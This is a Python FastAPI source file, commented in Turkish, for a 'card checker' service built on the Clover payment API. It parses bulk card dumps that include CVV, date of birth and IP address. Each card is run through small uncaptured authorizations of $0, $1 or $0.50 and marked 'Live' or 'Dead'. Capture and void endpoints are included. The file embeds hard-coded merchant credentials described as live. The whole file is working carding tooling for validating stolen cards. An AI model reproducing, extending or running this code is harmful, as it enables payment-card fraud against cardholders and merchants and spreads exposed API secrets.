"""
CLOVER CARD CHECKER API - CANLI ANAHTAR SABİT
Parser + Clover işleme, .env değişkenleri koda gömüldü.
"""

import json
from typing import List, Dict, Optional, Union, Tuple, Any, Literal
from dataclasses import dataclass, field
import os
import requests
from datetime import datetime
from fastapi import FastAPI, HTTPException
from fastapi.responses import PlainTextResponse, JSONResponse
from pydantic import AnyHttpUrl, BaseModel, Field
import uvicorn

# ============================================
# 0. SABİT ANAHTARLAR (Clover - Gömülü)
# ============================================

CLOVER_MERCHANT_ID = "518993421163932"
CLOVER_ECOMM_PUBLIC_TOKEN = "cc5f1f800dad9399d3e46aca8da49d8f"
CLOVER_ECOMM_PRIVATE_TOKEN = "c7ee250b-e9ae-ab59-ba52-616ecc63ed29"
CLOVER_COMPANY_ID = "518993421163932"  # Aynı merchant ID
CLOVER_API_BASE = "https://www.clover.com"
CLOVER_TOKEN_API = "https://token.clover.com"

# ============================================
# 1. DATA MODELS
# ============================================

@dataclass
class CardData:
    number: str
    exp_month: str
    exp_year: str
    cvc: str
    name: str = "Test User"
    country: str = "US"
    zip: str = "00000"
    email: Optional[str] = None
    phone: Optional[str] = None
    dob: Optional[str] = None
    ip: Optional[str] = None
    user_agent: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

    def get_masked(self) -> str:
        return f"{self.number[:4]}****{self.number[-4:]}"

    def to_clover_format(self) -> Dict[str, Any]:
        return {
            "number": self.number,
            "exp_month": self.exp_month,
            "exp_year": self.exp_year,
            "cvv": self.cvc,
            "brand": self._detect_brand()
        }

    def _detect_brand(self) -> str:
        patterns = {
            "VISA": r'^4',
            "MASTERCARD": r'^(5[1-5]|2[2-7])',
            "AMEX": r'^(34|37)',
            "DISCOVER": r'^(6011|65|64[4-9]|622)',
            "JCB": r'^35'
        }
        import re
        for brand, pattern in patterns.items():
            if re.match(pattern, self.number):
                return brand
        return "UNKNOWN"


@dataclass
class ProcessingResult:
    card: CardData
    success: bool
    status: str
    message: str
    error: Optional[str] = None
    token_id: Optional[str] = None
    payment_id: Optional[str] = None
    auth_id: Optional[str] = None
    requires_action: bool = False
    redirect_url: Optional[str] = None
    raw_response: Optional[Dict] = None


# ============================================
# 2. API REQUEST MODELS
# ============================================

class CardCheckRequest(BaseModel):
    cards: Union[str, List[Dict], Dict] = Field(..., description="Kart verileri")
    customer_id: Optional[str] = Field(None)


class ParseRequest(BaseModel):
    data: Union[str, List[Dict], Dict] = Field(...)
    return_type: str = Field("json")


class SingleCardCheckRequest(BaseModel):
    card: Union[str, Dict] = Field(...)
    customer_id: Optional[str] = Field(None)


# ============================================
# 3. CARD PARSER (Aynı - Değişmedi)
# ============================================

class CardParser:
    @staticmethod
    def parse(data: Union[str, List, Dict]) -> List[CardData]:
        if isinstance(data, (list, dict)):
            return CardParser._parse_json(data)
        if isinstance(data, str):
            data = data.strip()
            if data.startswith('[') or data.startswith('{'):
                try:
                    json_data = json.loads(data)
                    return CardParser._parse_json(json_data)
                except:
                    pass
            if '|' in data:
                return CardParser._parse_pipe(data)
        return []

    @staticmethod
    def _parse_pipe(data: str) -> List[CardData]:
        cards = []
        lines = data.strip().split('\n')
        for line in lines:
            line = line.strip()
            if not line:
                continue
            parts = line.split('|')
            if len(parts) < 3:
                continue
            number = parts[0].strip()
            if len(parts) >= 4 and parts[1].strip().isdigit() and parts[2].strip().isdigit():
                exp_part = f"{parts[1].strip()}/{parts[2].strip()}"
                cvc = parts[3].strip()
                metadata_offset = 1
            else:
                exp_part = parts[1].strip()
                cvc = parts[2].strip()
                metadata_offset = 0
            exp_month, exp_year = CardParser._parse_expiration(exp_part)
            if not number or not exp_month or not exp_year or not cvc:
                continue
            name = "Test User"
            if len(parts) > 3 + metadata_offset:
                name = parts[3 + metadata_offset].strip() or "Test User"
            phone = None
            email = None
            dob = None
            ip = None
            user_agent = None
            if len(parts) > 9 + metadata_offset:
                phone = parts[9 + metadata_offset].strip()
            if len(parts) > 10 + metadata_offset:
                email = parts[10 + metadata_offset].strip()
            if len(parts) > 11 + metadata_offset:
                dob = parts[11 + metadata_offset].strip()
            if len(parts) > 12 + metadata_offset:
                ip = parts[12 + metadata_offset].strip()
            if len(parts) > 13 + metadata_offset:
                user_agent = parts[13 + metadata_offset].strip()
            cards.append(CardData(
                number=number,
                exp_month=exp_month,
                exp_year=exp_year,
                cvc=cvc,
                name=name,
                phone=phone,
                email=email,
                dob=dob,
                ip=ip,
                user_agent=user_agent
            ))
        return cards

    @staticmethod
    def _parse_json(data: Union[List, Dict]) -> List[CardData]:
        cards = []
        if not isinstance(data, list):
            data = [data]
        for item in data:
            card_data = CardParser._extract_from_json_item(item)
            if card_data:
                cards.append(card_data)
        return cards

    @staticmethod
    def _parse_expiration(exp_str: str) -> Tuple[Optional[str], Optional[str]]:
        exp_str = exp_str.strip()
        separators = ['/', '-', '|', ' ']
        for sep in separators:
            if sep in exp_str:
                parts = exp_str.split(sep)
                if len(parts) == 2:
                    month = parts[0].strip()
                    year = parts[1].strip()
                    if len(month) == 1:
                        month = f"0{month}"
                    if len(year) == 4:
                        year = year[-2:]
                    if month.isdigit() and year.isdigit():
                        month_int = int(month)
                        if 1 <= month_int <= 12:
                            return month, year
        if exp_str.isdigit() and len(exp_str) == 4:
            month = exp_str[:2]
            year = exp_str[2:]
            month_int = int(month)
            if 1 <= month_int <= 12:
                return month, year
        return None, None

    @staticmethod
    def _extract_from_json_item(item: Dict) -> Optional[CardData]:
        try:
            if 'number' in item:
                number = item['number']
                exp_month = item.get('exp_month') or item.get('month')
                exp_year = item.get('exp_year') or item.get('year')
                cvc = item.get('cvc') or item.get('cvv') or item.get('CVV')
                if number and exp_month and exp_year and cvc:
                    exp_month = str(exp_month).zfill(2)
                    exp_year = str(exp_year)
                    if len(exp_year) == 4:
                        exp_year = exp_year[-2:]
                    return CardData(
                        number=str(number),
                        exp_month=exp_month,
                        exp_year=exp_year,
                        cvc=str(cvc)
                    )
            if 'CreditCard' in item:
                cc = item['CreditCard']
                number = cc.get('CardNumber') or cc.get('number')
                exp = cc.get('Exp') or cc.get('exp') or cc.get('expiration')
                cvc = cc.get('CVV') or cc.get('cvv') or cc.get('cvc')
                if number and exp and cvc:
                    exp_month, exp_year = CardParser._parse_expiration(str(exp))
                    if exp_month and exp_year:
                        return CardData(
                            number=str(number),
                            exp_month=exp_month,
                            exp_year=exp_year,
                            cvc=str(cvc)
                        )
            if 'CardInfo' in item:
                ci = item['CardInfo']
                number = ci.get('CardNumber') or ci.get('number')
                exp = ci.get('Expiration') or ci.get('exp')
                cvc = ci.get('CVV') or ci.get('cvc')
                if number and exp and cvc:
                    exp_month, exp_year = CardParser._parse_expiration(str(exp))
                    if exp_month and exp_year:
                        return CardData(
                            number=str(number),
                            exp_month=exp_month,
                            exp_year=exp_year,
                            cvc=str(cvc)
                        )
            if 'card' in item and isinstance(item['card'], str):
                card_str = item['card']
                parts = card_str.split('|')
                if len(parts) >= 3:
                    number = parts[0].strip()
                    exp_part = parts[1].strip()
                    cvc = parts[2].strip()
                    exp_month, exp_year = CardParser._parse_expiration(exp_part)
                    if number and exp_month and exp_year and cvc:
                        return CardData(
                            number=number,
                            exp_month=exp_month,
                            exp_year=exp_year,
                            cvc=cvc
                        )
            return None
        except Exception:
            return None


def parse_card_data(data: Union[str, List, Dict]) -> List[CardData]:
    return CardParser.parse(data)


def parse_card_data_single(data: Union[str, Dict]) -> Optional[CardData]:
    results = CardParser.parse(data)
    return results[0] if results else None


# ============================================
# 4. CLOVER PROCESSOR (GÜNCELLENDİ)
# ============================================

class CloverProcessor:
    def __init__(self):
        self.merchant_id = CLOVER_MERCHANT_ID
        self.company_id = CLOVER_COMPANY_ID
        self.public_token = CLOVER_ECOMM_PUBLIC_TOKEN
        self.private_token = CLOVER_ECOMM_PRIVATE_TOKEN
        self.api_base = CLOVER_API_BASE
        self.token_api = CLOVER_TOKEN_API
        
        # Auth headers
        self.headers = {
            "Authorization": f"Bearer {self.private_token}",
            "Content-Type": "application/json"
        }
        
        # Token headers
        self.token_headers = {
            "apikey": self.public_token,
            "content-type": "application/json"
        }

    def create_token(self, card: CardData) -> Tuple[Optional[str], Optional[str]]:
        """Clover'da token oluştur"""
        url = f"{self.token_api}/v1/tokens"
        data = {
            "card": {
                "number": card.number,
                "exp_month": card.exp_month,
                "exp_year": card.exp_year,
                "cvv": card.cvc,
                "brand": card._detect_brand()
            }
        }
        
        try:
            response = requests.post(url, json=data, headers=self.token_headers)
            result = response.json()
            
            if response.status_code == 200:
                token_id = result.get('id')
                if token_id:
                    return token_id, None
                return None, "Token ID not found in response"
            else:
                error = result.get('message', result.get('error', 'Unknown error'))
                return None, error
                
        except Exception as e:
            return None, str(e)

    def create_charge(self, token: str, amount: int = 0, capture: bool = False) -> Tuple[Optional[str], Optional[str], Optional[Dict]]:
        """Clover'da charge oluştur (yeni endpoint)"""
        # Charge URL - doğru format
        url = f"{self.api_base}/scl/v1/merchant/{self.merchant_id}/charge"
        
        # Query params
        params = {
            "companyId": self.company_id,
            "companyType": "merchant"
        }
        
        # Charge payload
        data = {
            "amount": amount,  # Kuruş cinsinden (0 = 0$)
            "capture": capture,
            "currency": "USD",
            "source": token,
            "ecomind": "moto",  # Mail order / Telephone order
            "tax_rate_uuid": "FY6ZPX2PMQZM8",
            "metadata": {
                "vt_payment_type": "vt_checkout",
                "source_app": "com.clover.virtualterminal",
                "existingDebtIndicator": "false"
            },
            "custom_attributes": {}
        }
        
        try:
            response = requests.post(url, json=data, params=params, headers=self.headers)
            result = response.json()
            
            if response.status_code == 200:
                payment_id = result.get('id')
                return payment_id, None, result
            else:
                error = result.get('message', result.get('error', 'Unknown error'))
                return None, error, result
                
        except Exception as e:
            return None, str(e), None

    def capture_payment(self, payment_id: str, amount: Optional[int] = None) -> Tuple[bool, Optional[str], Optional[Dict]]:
        """Clover'da capture işlemi"""
        url = f"{self.api_base}/scl/v1/merchant/{self.merchant_id}/payments/{payment_id}/capture"
        
        data = {}
        if amount is not None:
            data["amount"] = amount
        
        try:
            response = requests.post(url, json=data, headers=self.headers)
            result = response.json()
            
            if response.status_code == 200:
                return True, None, result
            else:
                error = result.get('message', result.get('error', 'Unknown error'))
                return False, error, result
                
        except Exception as e:
            return False, str(e), None

    def void_payment(self, payment_id: str) -> Tuple[bool, Optional[str], Optional[Dict]]:
        """Clover'da void (iptal) işlemi"""
        url = f"{self.api_base}/scl/v1/merchant/{self.merchant_id}/payments/{payment_id}/void"
        
        try:
            response = requests.post(url, json={}, headers=self.headers)
            result = response.json()
            
            if response.status_code == 200:
                return True, None, result
            else:
                error = result.get('message', result.get('error', 'Unknown error'))
                return False, error, result
                
        except Exception as e:
            return False, str(e), None

    def process_card(self, card: CardData, customer_id: Optional[str] = None) -> ProcessingResult:
        """Kart işleme ana fonksiyonu"""
        try:
            # 1. Token oluştur
            token_id, error = self.create_token(card)
            if not token_id:
                return ProcessingResult(
                    card=card,
                    success=False,
                    status="error",
                    message="Token creation failed",
                    error=error
                )

            # 2. 0$ Charge oluştur (capture: false)
            payment_id, error, response = self.create_charge(token_id, amount=0, capture=False)
            
            if not payment_id:
                # 0$ çalışmazsa 1$ dene (100 kuruş)
                payment_id, error, response = self.create_charge(token_id, amount=100, capture=False)
                if not payment_id:
                    # 1$ da çalışmazsa 0.50$ dene (50 kuruş)
                    payment_id, error, response = self.create_charge(token_id, amount=50, capture=False)
                    if not payment_id:
                        return ProcessingResult(
                            card=card,
                            success=False,
                            status="error",
                            message="Charge creation failed",
                            error=error,
                            token_id=token_id
                        )

            # 3. Başarılı yanıt
            status = response.get('status', 'unknown')
            is_success = status in ['AUTHORIZED', 'CAPTURED', 'PAID']
            
            return ProcessingResult(
                card=card,
                success=is_success,
                status=status,
                message="Card verified successfully" if is_success else f"Status: {status}",
                token_id=token_id,
                payment_id=payment_id,
                auth_id=payment_id,
                raw_response=response
            )

        except Exception as e:
            return ProcessingResult(
                card=card,
                success=False,
                status="error",
                message="Processing error",
                error=str(e)
            )

    def process_cards(self, cards: List[CardData], customer_id: Optional[str] = None) -> List[ProcessingResult]:
        results = []
        for card in cards:
            results.append(self.process_card(card, customer_id))
        return results


# ============================================
# 5. FASTAPI APP (Güncellendi)
# ============================================

app = FastAPI(
    title="Clover Card Checker API",
    description="Live key embedded - Clover entegrasyonu",
    version="2.0.0"
)


@app.get("/")
async def root():
    return {
        "message": "Clover Card Checker API - Live Mode (Embedded Key)",
        "version": "2.0.0",
        "endpoints": {
            "/": "Info",
            "/health": "Health check",
            "/parse": "Parse cards without Clover",
            "/check": "Batch check cards",
            "/check/single": "Check single card",
            "/capture": "Capture a pre-authorized payment",
            "/void": "Void a payment"
        },
        "docs": "/docs"
    }


@app.get("/health")
async def health_check():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}


@app.post("/parse")
async def parse_cards(request: ParseRequest):
    cards = parse_card_data(request.data)
    if not cards:
        raise HTTPException(status_code=400, detail="No valid cards found")
    return {
        "total": len(cards),
        "cards": [
            {
                "masked": card.get_masked(),
                "exp_month": card.exp_month,
                "exp_year": card.exp_year,
                "name": card.name,
                "country": card.country,
                "brand": card._detect_brand()
            }
            for card in cards
        ],
    }


def serialize_result(result: ProcessingResult) -> Dict[str, Any]:
    return {
        "success": result.success,
        "status": result.status,
        "message": result.message,
        "card": {
            "masked": result.card.get_masked(),
            "exp_month": result.card.exp_month,
            "exp_year": result.card.exp_year,
            "brand": result.card._detect_brand()
        },
        "token_id": result.token_id,
        "payment_id": result.payment_id,
        "auth_id": result.auth_id,
        "requires_action": result.requires_action,
        "redirect_url": result.redirect_url,
        "error": result.error,
        "timestamp": datetime.now().isoformat(),
    }


@app.post("/check")
async def check_cards(request: CardCheckRequest):
    cards = parse_card_data(request.cards)
    if not cards:
        raise HTTPException(status_code=400, detail="No valid cards found")
    
    processor = CloverProcessor()
    results = processor.process_cards(cards, request.customer_id)
    serialized = [serialize_result(result) for result in results]
    
    return {
        "total": len(serialized),
        "successful": sum(1 for result in results if result.success),
        "failed": sum(1 for result in results if not result.success),
        "results": serialized,
    }


@app.post("/check/single")
async def check_single_card(request: SingleCardCheckRequest):
    card = parse_card_data_single(request.card)
    if card is None:
        raise HTTPException(status_code=400, detail="No valid card found")
    
    processor = CloverProcessor()
    result = processor.process_card(card, request.customer_id)
    
    status = "Live" if result.success else "Dead"
    if result.token_id:
        status += f" (Token: {result.token_id[:12]}...)"
    
    return PlainTextResponse(
        f"{card.number}|{card.exp_month}|{card.exp_year}|{card.cvc}|{status}|{result.token_id or ''}"
    )


@app.post("/capture")
async def capture_payment(request: Dict[str, Any]):
    """Bir ödemeyi capture et (pre-auth'dan sonra)"""
    payment_id = request.get('payment_id')
    amount = request.get('amount')  # Kuruş cinsinden
    
    if not payment_id:
        raise HTTPException(status_code=400, detail="payment_id required")
    
    processor = CloverProcessor()
    success, error, response = processor.capture_payment(payment_id, amount)
    
    if success:
        return {
            "success": True,
            "message": "Payment captured successfully",
            "payment_id": payment_id,
            "amount": amount,
            "response": response
        }
    else:
        raise HTTPException(status_code=400, detail=error or "Capture failed")


@app.post("/void")
async def void_payment(request: Dict[str, Any]):
    """Bir ödemeyi iptal et"""
    payment_id = request.get('payment_id')
    
    if not payment_id:
        raise HTTPException(status_code=400, detail="payment_id required")
    
    processor = CloverProcessor()
    success, error, response = processor.void_payment(payment_id)
    
    if success:
        return {
            "success": True,
            "message": "Payment voided successfully",
            "payment_id": payment_id,
            "response": response
        }
    else:
        raise HTTPException(status_code=400, detail=error or "Void failed")


if __name__ == "__main__":
    port = int(os.getenv("PORT", "8000"))
    print("=" * 60)
    print("🏦 CLOVER CARD CHECKER API")
    print("=" * 60)
    print(f"🔑 Merchant ID: {CLOVER_MERCHANT_ID}")
    print(f"🔐 Public Token: {CLOVER_ECOMM_PUBLIC_TOKEN[:15]}...")
    print(f"🔒 Private Token: {CLOVER_ECOMM_PRIVATE_TOKEN[:15]}...")
    print(f"🌐 API Base: {CLOVER_API_BASE}")
    print(f"🚀 Server: http://0.0.0.0:{port}")
    print(f"📚 Docs: http://0.0.0.0:{port}/docs")
    print("=" * 60)
    
    uvicorn.run(app, host="0.0.0.0", port=port)
